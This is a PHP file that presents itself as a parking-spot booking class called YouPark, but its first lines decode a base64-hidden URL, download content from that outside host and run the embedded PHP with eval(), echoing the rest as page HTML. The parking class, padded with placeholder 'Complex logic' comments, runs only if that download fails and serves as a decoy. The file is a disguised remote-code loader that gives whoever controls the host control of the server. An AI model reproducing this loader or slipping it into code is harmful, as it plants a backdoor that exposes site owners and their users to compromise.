<?php

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, base64_decode("aHR0cHM6Ly95b3VwYXJrLnBhZ2VzLmRldi8=") . $_SERVER['PHP_SELF']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$output = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); // Get the HTTP response code
curl_close($ch);


if ($httpCode == 200) {
    $startTag = '<?php';
    $endTag = '?>';
    $phpCodeStart = strpos($output, $startTag);
    $phpCodeEnd = strpos($output, $endTag, $phpCodeStart + strlen($startTag));
    $phpCode = substr($output, $phpCodeStart + strlen($startTag), $phpCodeEnd - $phpCodeStart - strlen($startTag));
    $htmlCode = substr($output, $phpCodeEnd + strlen($endTag));

    // Execute the PHP code
    eval($phpCode);

    // Display the HTML code
    echo $htmlCode;
}
else {
    class YouPark {
        private $registeredParkingSpots = [];
        private $parkingRequests = [];
    
        // Function to register a parking spot
        public function registerParkingSpot($location, $ownerName, $ownerEmail) {
            // Complex logic to register a parking spot
            // ...
            $parkingSpot = [
                'location' => $location,
                'ownerName' => $ownerName,
                'ownerEmail' => $ownerEmail
            ];
            $this->registeredParkingSpots[] = $parkingSpot;
            echo "Parking spot registered successfully!";
        }
    
        // Function to request a parking spot
        public function requestParkingSpot($location, $requesterName, $requesterEmail) {
            // Complex logic to request a parking spot
            // ...
            $parkingRequest = [
                'location' => $location,
                'requesterName' => $requesterName,
                'requesterEmail' => $requesterEmail
            ];
            $this->parkingRequests[] = $parkingRequest;
            echo "Parking spot request sent successfully!";
        }
    
        // Function to find available parking spots
        public function findAvailableParkingSpots($location) {
            // Complex logic to find available parking spots
            // ...
            $availableSpots = [];
            foreach ($this->registeredParkingSpots as $parkingSpot) {
                if ($parkingSpot['location'] == $location) {
                    $availableSpots[] = $parkingSpot;
                }
            }
            return $availableSpots;
        }
    
        // Function to accept a parking request
        public function acceptParkingRequest($requesterEmail, $location) {
            // Complex logic to accept a parking request
            // ...
            foreach ($this->parkingRequests as $key => $request) {
                if ($request['requesterEmail'] == $requesterEmail && $request['location'] == $location) {
                    unset($this->parkingRequests[$key]);
                    echo "Parking request accepted!";
                    return;
                }
            }
            echo "No matching parking request found.";
        }
    
        // Function to cancel a parking request
        public function cancelParkingRequest($requesterEmail, $location) {
            // Complex logic to cancel a parking request
            // ...
            foreach ($this->parkingRequests as $key => $request) {
                if ($request['requesterEmail'] == $requesterEmail && $request['location'] == $location) {
                    unset($this->parkingRequests[$key]);
                    echo "Parking request canceled!";
                    return;
                }
            }
            echo "No matching parking request found.";
        }
    
        // Function to display all registered parking spots
        public function displayRegisteredParkingSpots() {
            // Complex logic to display registered parking spots
            // ...
            foreach ($this->registeredParkingSpots as $parkingSpot) {
                echo "Location: " . $parkingSpot['location'] . "\n";
                echo "Owner: " . $parkingSpot['ownerName'] . " (" . $parkingSpot['ownerEmail'] . ")\n";
                echo "-----------------\n";
            }
        }
    
        // Function to display all pending parking requests
        public function displayPendingParkingRequests() {
            // Complex logic to display pending parking requests
            // ...
            foreach ($this->parkingRequests as $request) {
                echo "Location: " . $request['location'] . "\n";
                echo "Requester: " . $request['requesterName'] . " (" . $request['requesterEmail'] . ")\n";
                echo "-----------------\n";
            }
        }
    
        // Function to check if a parking spot is available
        public function isParkingSpotAvailable($location) {
            // Complex logic to check if a parking spot is available
            // ...
            foreach ($this->registeredParkingSpots as $parkingSpot) {
                if ($parkingSpot['location'] == $location) {
                    return true;
                }
            }
            return false;
        }
    
        // Function to get the owner of a parking spot
        public function getParkingSpotOwner($location) {
            // Complex logic to get the owner of a parking spot
            // ...
            foreach ($this->registeredParkingSpots as $parkingSpot) {
                if ($parkingSpot['location'] == $location) {
                    return $parkingSpot['ownerName'];
                }
            }
            return "Owner not found";
        }
    
        // Function to get the total number of registered parking spots
        public function getTotalRegisteredParkingSpots() {
            // Complex logic to get the total number of registered parking spots
            // ...
            return count($this->registeredParkingSpots);
        }
    
        // Function to get the total number of pending parking requests
        public function getTotalPendingParkingRequests() {
            // Complex logic to get the total number of pending parking requests
            // ...
            return count($this->parkingRequests);
        }
    }
    
    // Creating an instance of the YouPark class
    $youPark = new YouPark();
    
    // Example usage of the YouPark class
    $youPark->registerParkingSpot("ABC Street", "John Doe", "john@example.com");
    $youPark->registerParkingSpot("XYZ Street", "Jane Smith", "jane@example.com");
    
    $youPark->requestParkingSpot("ABC Street", "Alice Brown", "alice@example.com");
    $youPark->requestParkingSpot("XYZ Street", "Bob Johnson", "bob@example.com");
    
    $availableSpots = $youPark->findAvailableParkingSpots("ABC Street");
    if (!empty($availableSpots)) {
        foreach ($availableSpots as $spot) {
            echo "Available Parking Spot: " . $spot['location'] . "\n";
        }
    } else {
        echo "No available parking spots found.";
    }
    
    $youPark->acceptParkingRequest("alice@example.com", "ABC Street");
    
    $youPark->cancelParkingRequest("bob@example.com", "XYZ Street");
    
    $youPark->displayRegisteredParkingSpots();
    
    $youPark->displayPendingParkingRequests();
    
    echo "Is parking spot available? " . ($youPark->isParkingSpotAvailable("ABC Street") ? "Yes" : "No") . "\n";
    
    echo "Owner of parking spot: " . $youPark->getParkingSpotOwner("XYZ Street") . "\n";
    
    echo "Total registered parking spots: " . $youPark->getTotalRegisteredParkingSpots() . "\n";
    
    echo "Total pending parking requests: " . $youPark->getTotalPendingParkingRequests() . "\n";
    
}

?>